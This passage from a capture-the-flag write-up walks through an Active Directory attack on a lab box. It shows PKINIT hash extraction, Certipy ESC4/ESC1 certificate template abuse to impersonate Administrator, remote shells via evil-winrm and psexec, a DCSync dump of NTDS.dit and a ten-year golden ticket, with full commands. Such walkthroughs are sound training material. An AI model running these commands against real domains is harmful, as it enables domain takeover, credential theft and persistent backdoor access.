           python3 /home/kali/windowsTools/PKINITtools/gettgtpkinit.py -cert-pem CACert_cert.pem -key-pem CACert_priv.pem $domain/ca_svc ca_svc.ccache
        ```
    -   {{< figure src="/ox-hugo/2025-01-14-071932_.png" >}}

8.  **Next we will load the** `.ccache` **into our** `KRB5CCNAME` **variable as we will need this for next step**:
    ```shell
    export KRB5CCNAME=./ca_svc.ccache
    ```

9.  **Requesting the** `ca_svc` **user hash with PKINITtools** `getnthash`:
    -   Extract the NTHash for the `ca_svc` user:
        ```shell
           python3 /home/kali/windowsTools/PKINITtools/getnthash.py -key 431c[SNIP]6aee9c22ff3391d9 $domain/CA_SVC
        ```
10. {{< figure src="/ox-hugo/2025-01-14-072605_.png" >}}
    -   We now have the `ca_svc` users NT hash.

11. **Verify the hash is valid**:
    -   {{< figure src="/ox-hugo/2025-01-14-072827_.png" >}}
    -   We now own the `ca_svc` user.


### Re-running Certipy As `ca_svc`: {#re-running-certipy-as-ca-svc}

-   As we are in control of `ca_svc` let's re-check if we have access to any vulnerable certificates to privesc:

<!--listend-->

```shell
certipy-ad find -vulnerable -u $user@$domain -hashes :$hash -dc-ip $box
```

-   {{< figure src="/ox-hugo/2025-01-14-074022_.png" >}}

-   So we can see there is a vulnerable cert available: `DunderMifflinAuthentication` and it's vulnerable to the ESC4 attack vector. As we are part of the `Cert Publishers` group we can perform this attack:
    -   {{< figure src="/ox-hugo/2025-01-14-074055_.png" >}}


### Performing ESC4 Certificate Attack To Get An Admin Certificate: {#performing-esc4-certificate-attack-to-get-an-admin-certificate}

-   Checking the certipy git repo it details what we need to do to perform this attack.
    -   <https://github.com/ly4k/Certipy?tab=readme-ov-file#esc4>

        > ESC4 is when a user has write privileges over a certificate template. This can for instance be abused to overwrite the configuration of the certificate template to make the template vulnerable to ESC1.

        -   So we effectively perform an ESC1 attack by overwriting the template.

<!--listend-->

1.  **Backup original cert**:
    -   As we overwrite the cert to perform this attack I will make a backup.
        ```shell
         certipy template -username ca_svc@$domain -hashes :$hash -template DunderMifflinAuthentication -save-old
        ```
    -   {{< figure src="/ox-hugo/2025-01-14-074922_.png" >}}

2.  **Perform ESC1 attack on the cert**:
    -   We can specify an arbitrary SAN with the `-upn` or `-dns` parameter.
        -   This is the correct command, however read the section below if you get a DNS error.
            ```shell
                 ertipy req -username ca_svc@$domain -hashes :$hash -ca sequel-DC01-CA -target $machine.$domain -template DunderMifflinAuthentication -upn administrator@$domain -ns $box
            ```

            -   {{< figure src="/ox-hugo/2025-01-15-075421_.png" >}}

    -   +Troubleshooting+: If you get the error `CERTSRV_E_SUBJECT_DNS_REQUIRED`:
        -   {{< figure src="/ox-hugo/2025-01-14-150127_.png" >}}
        -   I got this error a lot and went down rabbit holes trying to fix it. Whereas it actually seems to be down to some sort cleanup script running on the host.
        -   **How to get it working**:
            -   I was able to get it working by quickly chaining step 1 (Backup Script) &amp; 2 (ESC1 Attack)
                -   If you look at the time stamp you can see that I had to run these 7 seconds apart to get the attack chain to work.
                -   {{< figure src="/ox-hugo/2025-01-15-075216_.png" >}}

3.  **Authenticate as the Administrator using the certificate**:
    -   Now we authenticate with the certificate, to receive the NT hash of the Administrator user:
        ```shell
        certipy-ad auth -pfx administrator.pfx -domain $domain
        ```
    -   {{< figure src="/ox-hugo/2025-01-15-080127_.png" >}}

4.  **Verify it works**:
    -   Using evil-winrm
        ```shell
          evil-winrm -i $box -u administrator -H $hash
        ```

        -   {{< figure src="/ox-hugo/2025-01-15-080236_.png" >}}

    -   Using the `.ccache`
        ```shell
        #Load the .ccache into the KRB5CCNAME var
        export KRB5CCNAME=./administrator.ccache

        #Use impacket-psexec
        impacket-psexec -k -no-pass $machine.$domain
        ```

        -   {{< figure src="/ox-hugo/2025-01-15-081439_.png" >}}
        -   I knew it work but always better to validate.

5.  **Lets get the root flag**:
    -   {{< figure src="/ox-hugo/2025-01-15-083906_.png" >}}


## 5. Persistence: {#5-dot-persistence}

-   You may be wondering why we would look at persistence if we already have a valid administrator certificate. However if we examine the expiration time on the cert we can see its only valid for 10 hours.
    ```shell
    klist
    ```

    -   {{< figure src="/ox-hugo/2025-01-15-081634_.png" >}}

-   So instead I will dump the `NTDS.dit` &amp; create a golden ticket for good measure.


### Dumping NTDS.dit/DCSync attack: {#dumping-ntds-dot-dit-dcsync-attack}

-   **Perform DCSync attack using netexec**:
    ```nil
    netexec smb $box -u administrator --use-kcache -M ntdsutil
    ```

    -   {{< figure src="/ox-hugo/2025-01-15-082140_.png" >}}

-   **Extract all hashes from netexec**
    ```shell
    for file in /home/kali/.nxc/logs/*.ntds; do cat "$file" | cut -d ':' -f1,2,4 --output-delimiter=' ' | awk '{print $3, $2, $1}'; printf '\n'; done
    ```

    -   {{< figure src="/ox-hugo/2025-01-15-082225_.png" >}}


### Creating a Kerberos Golden Ticket: {#creating-a-kerberos-golden-ticket}

-   **Using** `impacket-lookupsid` **to get the Search for the Domain SID**:
    ```shell
    impacket-lookupsid $domain/$user@$machine.$domain -domain-sids -k -no-pass
    ```

    -   {{< figure src="/ox-hugo/2025-01-15-082328_.png" >}}
    -   I store this in the variable `$sid`

<!--listend-->

-   **Using** `impacket-secretsdump` **to retrieve the** `aeskey` **of the** `krbtgt` **account**:
    ```shell
    impacket-secretsdump $domain/$user@$box -hashes :$hash
    ```

    -   {{< figure src="/ox-hugo/2025-01-15-082620_.png" >}}
    -   I store `krbtgt:aes256` value in the variable `$krbtgt`

-   **Sync our clock to the host using ntpdate**:
    ```shell
    #Using ntpdate
    sudo ntpdate -s $domain

    #Using faketime
    faketime "$(ntpdate -q $domain | cut -d ' ' -f 1,2)"
    ```

-   **Using** `impacket-ticketer` **to create the Golden Ticket**:
    ```shell
    #Using -aeskey
    impacket-ticketer -aesKey $krbtgt -domain-sid $sid -domain $domain Administrator
    ```

-   **Export the ticket to the** `KRB5CCNAME` **Variable**:
    ```shell
    export KRB5CCNAME=./Administrator.ccache
    ```

-   **Verify the ticket is loaded into memory**:
    ```klist
    klist
    ```

    -   {{< figure src="/ox-hugo/2025-01-15-083332_.png" >}}
    -   As we can see this ticket lasts for 10 years, which is better than 10 hours.

-   **Use the ticket for connecting via** `psexec`
    ```shell
    impacket-psexec -k -no-pass $machine.$domain
    ```

    -   {{< figure src="/ox-hugo/2025-01-15-084603_.png" >}}


#### Why create a golden ticket? {#why-create-a-golden-ticket}

-   "But bloodstiller why are you making a golden ticket if you have the admin hash?" Glad you asked:
    -   Creating a Golden Ticket during an engagement is a reliable way to maintain access over the long haul. Here’s why:
    -   `KRBTGT` **Hash Dependence**:
        -   Golden Tickets are generated using the `KRBTGT` account hash from the target’s domain controller.
        -   Unlike user account passwords, `KRBTGT` hashes are rarely rotated (and in many organizations, +they are never changed+), so in most cases the Golden Ticket remains valid indefinitely.
    -   `KRBTGT` **Hash—The Key to It All (for upto 10 years)**:
        -   A Golden Ticket can allow you to maintain access to a system for up to 10 years (yeah, you read that right the default lifespan of a golden ticket is 10 years) without needing additional credentials.
        -   This makes it a reliable backdoor, especially if re-access is needed long after initial entry.
        -   **Think about it**: even if they reset every user’s password (including the administrator etc) your Golden Ticket is still valid because it’s tied to the `KRBTGT` account, not individual users.


## Lessons Learned: {#lessons-learned}


### What did I learn? {#what-did-i-learn}

1.  Stop jumping to flashy techniques when you havent' even performed basic enumeration just yet. (Finding password re-use in a file)
2.  I learned that even though I know the attack path if someone has put a cleanup script in place it will cause me to go down a rabbit hole, it's one of the few times where faster is better.


### What silly mistakes did I make? {#what-silly-mistakes-did-i-make}

1.  using \\\\ on http request e.g `http:\\` DAMN YOU WINDOWS and your backslashes.


## Sign off: {#sign-off}

Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!

Until next time, hack the planet!

&#x2013; Bloodstiller

&#x2013; Get in touch bloodstiller at bloodstiller dot com


